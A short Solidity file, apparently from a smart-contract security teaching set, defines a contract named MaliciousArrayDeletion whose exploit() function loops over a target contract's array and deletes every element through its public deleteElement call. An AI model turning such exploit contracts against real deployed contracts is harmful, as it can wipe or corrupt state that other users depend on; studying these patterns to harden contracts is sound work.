// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./Array-deletion.sol";

contract MaliciousArrayDeletion {
    FixedArrayDeletion public fixedArrayDeletion;

    constructor(address _fixedArrayDeletion) {
        fixedArrayDeletion = FixedArrayDeletion(_fixedArrayDeletion);
    }

    function exploit() public {
        uint length = fixedArrayDeletion.getLength();
        for (uint i = 0; i < length; i++) {
            fixedArrayDeletion.deleteElement(0);
        }
    }
}